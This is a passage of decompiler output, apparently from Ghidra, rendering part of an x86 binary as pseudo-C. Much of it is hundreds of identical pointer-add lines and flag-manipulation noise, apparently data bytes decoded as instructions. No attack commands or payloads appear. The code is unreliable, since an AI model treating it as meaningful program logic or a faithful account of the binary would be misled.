*(in_stack_ffffffc8 + 0x13) = *(in_stack_ffffffc8 + 0x13) & piVar19;\n                        uVar53 = in_AF;\n                        uVar6 = uVar57 & 0xffffffff00000000 | ZEXT48(piVar13);\n                    }\ncode_r0x0046c4c4:\n                    iVar46 = uVar6 >> 0x20;\n                    *(in_stack_ffffffc8 + 0x13) = *(in_stack_ffffffc8 + 0x13) & piVar19;\n                    in_stack_0000000b = 0xf;\n                    puVar14 = iVar46 + 0x49;\n                    uVar10 = uVar6 >> 0x20;\n                    *puVar14 = *puVar14 & uVar10;\n                    piVar52 = piVar52 + 1;\n                    piVar19 = piVar19 + -1;\n                    in_stack_0000000a = piVar34 >> 0x18;\n                    puVar14 = iVar46 + 0x45;\n                    *puVar14 = *puVar14 & uVar10;\n                    in_AF = uVar53;\ncode_r0x0046c4d4:\n                    var_4h._3_1_ = uVar6;\n                    uStack4._0_1_ = uVar6 >> 8;\n                    uStack4._1_2_ = uVar6 >> 0x10;\n                    puVar43 = puVar43 + 2;\n                    *piVar19 = *piVar19 + piVar19;\n                    uStack4._0_1_ = uStack4 + -4;\n                    *uVar6 = *uVar6 + (in_stack_ffffffc8 >> 8);\n                    in_AF = in_AF | 1;\n                    uVar25 = CONCAT11((&stack0xfffffffc >> 8) - in_AF, in_AF * -6 + -4) & 0xff0f;\n                    piVar45 = &stack0xffffff00 & 0xffff0000 | uVar25;\n                    bVar54 = SCARRY4(in_stack_ffffffc8, 1);\n                    in_stack_ffffffc8 = in_stack_ffffffc8 + 1;\n                    in_stack_00000012 = uStack4._1_2_;\n                    if (in_stack_ffffffc8 != NULL) {\n                        if (!bVar54) {\n                            cVar8 = uVar25;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            piVar13 = piVar19[2];\n                            puVar43 = piVar19[3];\n                            arg_8h = piVar19[5];\n                            pcVar44 = piVar19[6];\n                            piVar45 = piVar19[8];\n                            in_stack_ffffffc8 = CONCAT31(piVar19[7] >> 8, 0x19);\n                            goto code_r0x0046c506;\n                        }\n                        goto code_r0x0046c551;\n                    }\n                }\n                cVar8 = piVar45;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *piVar45 = *piVar45 + cVar8;\n                *(puVar43 + -0x1a) = *(puVar43 + -0x1a) + (uVar6 >> 0x28);\n                while( true ) {\n                    pcVar44 = uVar6 >> 0x20;\n                    pcVar21 = uVar6;\n                    uVar53 = *piVar45;\n                    uVar10 = piVar45;\n                    *piVar45 = *piVar45 + uVar10;\n                    if (CARRY1(uVar53, uVar10)) break;\n                    while( true ) {\n                        cVar8 = piVar45;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        *piVar45 = *piVar45 + cVar8;\n                        if (*piVar45 == '\\0') break;\ncode_r0x0046c72a:\n                        *piVar45 = *piVar45 + piVar45;\n                        *piVar45 = *piVar45 + piVar45;\n                    }\n                }\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                cVar7 = in_stack_ffffffc8 >> 8;\n                *pcVar21 = *pcVar21 + cVar7;\n                *piVar45 = *piVar45 + uVar10;\n                cVar32 = piVar34;\n                *(piVar45 + -0x47ffba95) = *(piVar45 + -0x47ffba95) + cVar32;\n                uVar35 = piVar34 >> 8;\n                *(puVar43 + -0x47ffb96b) = *(puVar43 + -0x47ffb96b) + uVar35;\n                *(piVar45 + -0x47ffb96b) = *(piVar45 + -0x47ffb96b) + uVar35;\n                *(puVar43 + -0x47ffb96b) = *(puVar43 + -0x47ffb96b) + uVar35;\n                *(piVar45 + -0x47ffb96b) = *(piVar45 + -0x47ffb96b) + uVar35;\n                pcVar48 = pcVar21 + 5;\n                puVar14 = piVar52 + 0x7f;\n                uVar53 = *puVar14;\n                bVar56 = SCARRY1(*puVar14, uVar35);\n                *puVar14 = *puVar14 + uVar35;\n                bVar55 = *puVar14 < '\\0';\n                bVar54 = *puVar14 == 0;\n                uVar9 = *puVar14;\n                cVar8 = in_stack_ffffffc8;\n                uVar24 = uVar6 >> 0x20;\n                if (bVar54 || bVar56 != bVar55) {\n                    if (bVar54 || bVar56 != bVar55) {\n                        if (bVar54 || bVar56 != bVar55) {\n                            in_stack_0000000e =\n                                 (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 |\n                                 (in_VIF & 1) * 0x80000 >> 0x10 | (in_AC & 1) * 0x40000 >> 0x10;\n                            iVar46 = *piVar45 * -0x44;\n                            pcVar48 = iVar46 + -0x6a43ffba + pcVar44 * 4;\n                            *pcVar48 = *pcVar48 + uVar35;\n                            pcVar48 = iVar46 + -0x6a43ffba + pcVar44 * 4;\n                            *pcVar48 = *pcVar48 + uVar35;\n                            pcVar48 = iVar46 + -0x6a43ffba + pcVar44 * 4;\n                            *pcVar48 = *pcVar48 + uVar35;\n                            pcVar48 = pcVar21 + 9;\n                            *(piVar45 + 0x456b) = *(piVar45 + 0x456b) + (piVar45 >> 8);\n                            *piVar45 = *piVar45 + uVar10;\n                            *piVar45 = *piVar45 + uVar10;\n                            *piVar45 = *piVar45 + uVar10;\n                            *piVar45 = *piVar45 + uVar10;\n                            *piVar45 = *piVar45 + uVar10;\n                            *pcVar44 = *pcVar44 + uVar10;\n                            *piVar45 = *piVar45 + uVar10;\n                            uVar10 = uVar10 + uVar35;\n                            puVar14 = piVar45 & 0xffffff00 | uVar10;\n                            *(puVar14 * 2 + -6) =\n                                 CONCAT12(in_stack_0000000e, \n                                          (in_NT & 1) * 0x4000 | bVar56 * 0x800 | (in_IF & 1) * 0x200 |\n                                          (in_TF & 1) * 0x100 | bVar55 * 0x80 | bVar54 * 0x40 | (in_AF & 1) * 0x10 |\n                                          ((POPCOUNT(uVar9) & 1U) == 0) * 4 | CARRY1(uVar53, uVar35));\n                            in_stack_ffffffc8 = in_stack_ffffffc8 & 0xffff0000 | CONCAT11(cVar7 + uVar35, cVar8);\n                            *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar10;\n                            *puVar14 = *puVar14 + uVar10;\n                            *pcVar48 = *pcVar48 + uVar24;\n                            *puVar14 = *puVar14 + uVar10;\n                            *pcVar44 = *pcVar44 + uVar10;\n                            *puVar14 = *puVar14 + uVar10;\n                            *pcVar44 = *pcVar44 + uVar10;\n                            *puVar14 = *puVar14 + uVar10;\n                            *piVar34 = *piVar34 + uVar10;\n                            *puVar14 = *puVar14 + uVar10;\n                            *pcVar44 = *pcVar44 + uVar10;\n                            *puVar14 = *puVar14 + uVar10;\n                            *(puVar14 * 2) = *(puVar14 * 2) + uVar10;\n                            uVar53 = *puVar14;\n                            *puVar14 = *puVar14 + uVar10;\n                            *puVar14 = (*puVar14 - uVar10) - CARRY1(uVar53, uVar10);\n                            *puVar14 = *puVar14 + uVar10;\n                            puVar43 = puVar14 + 0xd000000;\n                            uVar53 = puVar43;\n                            *puVar43 = *puVar43 + uVar53;\n                            *pcVar48 = *pcVar48 + uVar53;\n                            *puVar43 = *puVar43 + uVar53;\n                            *in_stack_ffffffc8 = *in_stack_ffffffc8 + cVar8;\n                            *puVar43 = *puVar43 + uVar53;\n                            *piVar52 = *piVar52 + uVar53;\n                            *puVar43 = *puVar43 + uVar53;\n                            *(puVar43 * 2) = *(puVar43 * 2) + cVar8;\n                            *puVar43 = *puVar43 + uVar53;\n                            *puVar43 = *puVar43 | uVar53;\n                            *puVar43 = *puVar43 + uVar53;\n                            goto code_r0x0046c84e;\n                        }\n                    }\n                    else {\n                        *puVar43 = *puVar43 + puVar43;\n                    }\n                    *in_stack_ffffffc8 = *in_stack_ffffffc8 + cVar8;\n                    *puVar43 = *puVar43 + puVar43;\n                    *(puVar43 * 2) = *(puVar43 * 2) + cVar8;\n                }\n                else {\n                    *(puVar43 * 2) = *(puVar43 * 2) + cVar8;\ncode_r0x0046c84e:\n                    *puVar43 = *puVar43 + puVar43;\n                    *puVar43 = *puVar43 | puVar43;\n                    *puVar43 = *puVar43 + puVar43;\n                }\n                *puVar43 = *puVar43 + puVar43;\n                uVar10 = puVar43 | *puVar43;\n                pcVar21 = puVar43 & 0xffffff00 | uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                uVar9 = in_stack_ffffffc8;\n                *piVar34 = *piVar34 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar21 = *pcVar21 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *(pcVar21 * 2) = *(pcVar21 * 2) + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                in_stack_00000010 = in_SS;\n                in_stack_00000011 = in_SS >> 8;\n                *pcVar21 = *pcVar21 + uVar10;\n                *0x16000000 = *0x16000000 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *piVar52 = *piVar52 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar44 = *pcVar44 + uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar21 = *pcVar21 + uVar24;\n                *pcVar21 = *pcVar21 + uVar10;\n                *0x11000000 = *0x11000000 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar44 = *pcVar44 + uVar24;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar44 = *pcVar44 + uVar24;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar44 = *pcVar44 + uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + ((puVar43 & 0xffffff00) >> 8);\n                *pcVar21 = *pcVar21 + uVar10;\n                *0x35000000 = *0x35000000 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *pcVar44 = *pcVar44 + uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar10;\n                *pcVar21 = *pcVar21 + uVar10;\n                ppcVar17 = pcVar21 | 0x43000000;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *pcVar44 = *pcVar44 + uVar10;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *ppcVar17 = *ppcVar17 + uVar24;\n                uVar53 = *ppcVar17;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *ppcVar17 = ppcVar17 + *ppcVar17 + CARRY1(uVar53, uVar10);\n                *ppcVar17 = *ppcVar17 + uVar10;\n                in_stack_0000000d = uVar6 >> 0x28;\n                in_stack_0000000e = uVar6 >> 0x30;\n                in_stack_0000000f = uVar6 >> 0x38;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *0x53000000 = *0x53000000 + uVar9;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *0x57000000 = *0x57000000 + uVar9;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *pcVar48 = *pcVar48 + uVar24;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + cVar32;\n                *ppcVar17 = *ppcVar17 + uVar10;\n                puVar14 = ppcVar17 | *ppcVar17;\n                uVar10 = puVar14;\n                *puVar14 = *puVar14 + uVar10;\n                uVar53 = in(uVar6 >> 0x20);\n                *piVar52 = uVar53;\n                *puVar14 = *puVar14 + uVar10;\n                *0x6d000000 = *0x6d000000 + uVar9;\n                *puVar14 = *puVar14 + uVar10;\n                *puVar14 = *puVar14 + (puVar14 >> 8);\n                *puVar14 = *puVar14 + uVar10;\n                *puVar14 = *puVar14 + in_stack_0000000d;\n                uVar53 = *puVar14;\n                *puVar14 = *puVar14 + uVar10;\n                uVar10 = uVar10 - CARRY1(uVar53, uVar10);\n                puVar26 = puVar14 & 0xffffff00 | uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *puVar26 = *puVar26 | puVar26;\n                *puVar26 = *puVar26 + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *pcVar48 = *pcVar48 + uVar24;\n                *puVar26 = *puVar26 + uVar10;\n                *(puVar26 + 0x2800000) = *(puVar26 + 0x2800000) + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *(in_stack_ffffffc8 + 0x2800000) = *(in_stack_ffffffc8 + 0x2800000) + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                pcVar44[0x9000000] = pcVar44[0x9000000] + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *(piVar34 + 0x5800000) = *(piVar34 + 0x5800000) + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                pcVar21 = puVar26 * 2 + 0xd0000;\n                *pcVar21 = *pcVar21 + uVar10;\n                *puVar26 = *puVar26 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                cVar7 = (puVar14 & 0xffffff00) >> 8;\n                *puVar26 = *puVar26 + cVar7;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                pcVar48[0xd000000] = pcVar48[0xd000000] + cVar32;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                cVar8 = in_stack_ffffffc8 >> 8;\n                *(puVar26 + 0x800000) = *(puVar26 + 0x800000) + cVar8;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                pcVar21 = in_stack_ffffffc8 * 2 + 0xb0000;\n                *pcVar21 = *pcVar21 + cVar8;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                pcVar48 = pcVar48 + 4;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *0xb7000000 = *0xb7000000 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *puVar26 = *puVar26 + uVar24;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                pcVar44 = pcVar44 & 0xffff0000 | CONCAT11(in_stack_0000000d + uVar10, uVar24);\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *pcVar44 = *pcVar44 + uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                pcVar21 = piVar34 & 0xffff0000 | CONCAT11(uVar35 + uVar24, cVar32);\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *pcVar21 = *pcVar21 + uVar10;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + cVar32;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 | uVar9;\n                *in_stack_ffffffc8 = *in_stack_ffffffc8 + uVar9;\n                in_stack_0000000c = uVar24 + 0xc;\n                *pcVar48 = *pcVar48 + cVar7;\n                uVar25 = CONCAT11((&stack0x0000000c >> 8) - (in_AF | 1), (in_AF | 1) * -6 + '\\f') & 0xff0f;\n                puVar14 = *0x10 & 0xffff0000 | uVar25;\n                in_stack_ffffffc8[-1] = pcVar48;\n                uVar53 = uVar25;\n                if (puVar26 + 1 < 0) {\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + 